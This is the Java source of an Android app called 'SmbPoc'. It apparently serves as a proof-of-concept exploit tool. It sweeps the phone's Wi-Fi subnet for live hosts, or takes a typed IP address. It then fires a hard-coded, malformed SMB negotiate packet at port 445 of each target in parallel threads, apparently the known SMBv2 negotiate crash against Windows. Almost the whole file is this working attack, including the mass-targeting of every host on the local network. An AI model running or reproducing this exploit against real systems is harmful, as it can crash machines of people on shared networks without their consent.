package info.lamatricexiste.smbpoc;

import java.io.IOException;
import java.io.OutputStream;
import java.lang.Thread.UncaughtExceptionHandler;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;
import java.net.SocketException;
import java.io.IOException;

import android.app.Activity;
import android.content.Context;
import android.net.DhcpInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ListView;
import android.widget.TextView;
import android.app.ProgressDialog;


public class SmbPoc extends Activity
{
    final private int[] buff = {
        0x00,0x00,0x00,0x90,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,0x18,
        0x53,0xc8,0x00,0x26,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0xff,0xff,0xff,0xfe,0x00,0x00,0x00,0x00,0x00,0x6d,0x00,0x02,0x50,0x43,
        0x20,0x4e,0x45,0x54,0x57,0x4f,0x52,0x4b,0x20,0x50,0x52,0x4f,0x47,0x52,
        0x41,0x4d,0x20,0x31,0x2e,0x30,0x00,0x02,0x4c,0x41,0x4e,0x4d,0x41,0x4e,
        0x31,0x2e,0x30,0x00,0x02,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x66,
        0x6f,0x72,0x20,0x57,0x6f,0x72,0x6b,0x67,0x72,0x6f,0x75,0x70,0x73,0x20,
        0x33,0x2e,0x31,0x61,0x00,0x02,0x4c,0x4d,0x31,0x2e,0x32,0x58,0x30,0x30,
        0x32,0x00,0x02,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x32,0x2e,0x31,0x00,0x02,
        0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00,0x02,0x53,0x4d,
        0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00
    };
    private final int            TIMEOUT  = 300;
    final private int            PORT     = 445;
    private InetAddress          ip_net   = null;
    private InetAddress          ip_bc    = null;
    private InetAddress          host_id  = null;
    private WifiManager          wifi     = null;
    private DhcpInfo             dhcp     = null;
    private EditText             ipedit   = null;
    private ListView             list     = null;
    public  List<InetAddress>    hosts    = new ArrayList<InetAddress>();
    private List<String>         model    = new ArrayList<String>();
    private ArrayAdapter<String> adapter  = null;
    private Handler        messageHandler = null;
    private String                    hMsg= "";
    private InetAddress               hIp = null;
    protected ProgressDialog          progress; 


    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        TextView info = (TextView) findViewById(R.id.info); 
        ipedit = (EditText) findViewById(R.id.ip);
        Button btn = (Button) findViewById(R.id.btn);
        Button btn1 = (Button) findViewById(R.id.btn1);
        adapter = new ArrayAdapter<String>(this, R.layout.list, model);
        list = (ListView) findViewById(R.id.output);
        list.setAdapter(adapter);

//        addText(Integer.toString(getIpByStr("0.255.255.255").hashCode()));

        wifi = (WifiManager) this.getSystemService(Context.WIFI_SERVICE);
        if(wifi.isWifiEnabled()) {
            dhcp = wifi.getDhcpInfo();
            ip_bc = getBroadcastIP();
            ip_net = getNetIP();
            host_id = getHostId();
            
//            ip_bc = getIpByStr("172.22.255.255");
//            ip_net = getIpByStr("172.22.0.0");
//            host_id = getIpByStr("0.0.255.255");
            
            info.setText("IP: " + getIp(dhcp.ipAddress).getHostAddress() +
            		"  Network: " + ip_net.getHostAddress()+
                    "  Broadcast: "+ ip_bc.getHostAddress());
        }
        else {
            addText("No available network");
        }
       
        btn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                launchAttack();
            }
        });
       
        btn1.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                
            }
        });
        
        messageHandler = new Handler() {
            @Override
            public void handleMessage(Message msg) {
                switch(msg.what){
                case 0:
                    addText(hIp.getHostAddress() + " " + hMsg);
                    hIp = null;
                    hMsg = "";
                    break;
                case 1:
                    hMsg = "Socket Exception";
                    break;
                case 2:
                    hMsg = "I/O Exception";
                    break;
                case 3:
                    hMsg = "Uncaught Exception";
                    break;
                case 4:
                    hMsg = "Attacked";
                    break;
                case 5:
                    hMsg = "Nothing to do";
                    break;
                default:
                    hIp = getIp(msg.what);
                }
            }
        };
    }
    
    private void addText(String text){
        adapter.add(text);
        list.setSelection(list.FOCUS_DOWN);
    }
    
    private void launchAttack(){
        String input = ipedit.getText().toString();
        if(input.length()!=0){
            InetAddress ip_host = getIpByStr(ipedit.getText().toString());
            if(ip_host!=null){
                try {
                    hackthis(ip_host);
                } catch (Exception e) {
                    addText(e.getMessage());
                }
            }
        }
        else {
            if(ip_bc!=null && ip_net!=null){
                String ip_net_str = ip_net.getHostAddress();
                String[] ip_net_split = ip_net.getHostAddress().split("\\.");
                String[] ip_bc_split = ip_bc.getHostAddress().split("\\.");
                
                try{
                    switch (host_id.hashCode()) {
                    
                    case 7:
                    case 255:
                    case 65535:
                    case 16777215:
                        // 1.0.0.1 to 126.255.255.254 255.255.255.0
                        Integer start = Integer.parseInt(ip_net_split[(ip_net_split.length-1)])+1;
                        Integer end = Integer.parseInt(ip_bc_split[(ip_bc_split.length-1)])+1;
                        String ip_start = ip_net_str.substring(0, ip_net_str.lastIndexOf("."));
                        for(int i=start; i<end; i++){
                            InetAddress ip_host = InetAddress.getByName(ip_start+"."+i);
                            if(ip_host.isReachable(TIMEOUT)){
                                hosts.add(ip_host);
                            }
                        }
                        launchThreadAttack();
                        break;
                        
//                    case 65535:
//                        // 128.1.0.1 to 191.255.255.254 255.255.0.0
//                        Integer s1 = Integer.parseInt(ip_net_split[(ip_net_split.length-2)]);
//                        Integer e1 = Integer.parseInt(ip_bc_split[(ip_bc_split.length-2)]);
//                        Integer s2 = Integer.parseInt(ip_net_split[(ip_net_split.length-1)]);
//                        Integer e2 = Integer.parseInt(ip_bc_split[(ip_bc_split.length-1)]);
//                        String ip1 = ip_net_str.substring(0, ip_net_str.indexOf(".", 4));
//                        for(int i=s1; i<=e1; i++){
//                            for(int j=s2; j<=e2; j++){
//                                ip_host = InetAddress.getByName(ip1+"."+i+"."+j);
//                                hosts.add(ip_host);
//                            }
//                        }
////                        launchThreadAttack();
//                        break;
//                        
//                    case 16777215:
//                        // 192.0.1.1 to 223.255.254.254 255.0.0.0
//                        break;
                        
                    }
                }
                catch (IllegalArgumentException e) {
                    addText(e.getMessage());
                }
                catch (UnknownHostException e) {
                    addText(e.getMessage());
                }
                catch (IOException e) {
                    addText(e.getMessage());
                }
            }
        }
    }
    
    private InetAddress getHostId(){
        int network = ~dhcp.netmask;
        return getIp(network);
    }

    private InetAddress getNetIP(){
        int network = (dhcp.ipAddress & dhcp.netmask);
        return getIp(network);
    }

    private InetAddress getBroadcastIP(){
        int broadcast = (dhcp.ipAddress & dhcp.netmask) | ~dhcp.netmask;
        return getIp(broadcast);
    }

    private InetAddress getIpByStr(String ip) {
        try {
            return InetAddress.getByName(ip);
        }
        catch (java.net.UnknownHostException e) {
            addText(e.getMessage());
            return null;
        }

    }
    
    private InetAddress getIp(int ip_int){
        byte[] quads = new byte[4];
        
        for (int k = 0; k < 4; k++)
            quads[k] = (byte) ((ip_int >> k * 8) & 0xFF);
        try {
            return InetAddress.getByAddress(quads);
        }
        catch (java.net.UnknownHostException e) {
            addText(e.getMessage());
            return null;
        }
    }

    private int getIpInt(InetAddress ip_addr) {
        String[] a = ip_addr.getHostAddress().split("\\.");
        return (
                Integer.parseInt(a[3])*16777216 + 
                Integer.parseInt(a[2])*65536 +
                Integer.parseInt(a[1])*256 +
                Integer.parseInt(a[0])
        );
    }

/**
 * Thread
 */  
    public void launchThreadAttack(){
        progress = ProgressDialog.show(SmbPoc.this, "", "Chargement", true);
        for(final InetAddress h : hosts){
            Thread t = new Thread() {
                public void run(){
                    messageHandler.sendMessage(Message.obtain(messageHandler, 5)); 
                    hackthis(h);
                    messageHandler.sendMessage(Message.obtain(messageHandler, getIpInt(h))); 
                    messageHandler.sendMessage(Message.obtain(messageHandler, 0)); 
                }
            };
            t.setUncaughtExceptionHandler(new UncaughtExceptionHandler() {
                @Override
                public void uncaughtException(Thread thread, Throwable ex) {
                    messageHandler.sendMessage(Message.obtain(messageHandler, 3)); 
                }
            });
            t.setDaemon(true);
            t.start();
        }
        progress.dismiss();
    }
    
    public void hackthis(InetAddress h) {
        try{
            Socket s = new Socket();
            s.bind(null);
            s.connect(new InetSocketAddress(h, PORT), TIMEOUT);
            OutputStream out = s.getOutputStream();
            for(int b: buff){
                out.write(b);
            }
            out.close();
            s.close();
            messageHandler.sendMessage(Message.obtain(messageHandler, 4)); 
        }
        catch (java.net.SocketException e){
            messageHandler.sendMessage(Message.obtain(messageHandler, 1));
        }
        catch (java.io.IOException e){
            messageHandler.sendMessage(Message.obtain(messageHandler, 2));
        }
    }
    
/*
 * End Thread
 **/
}
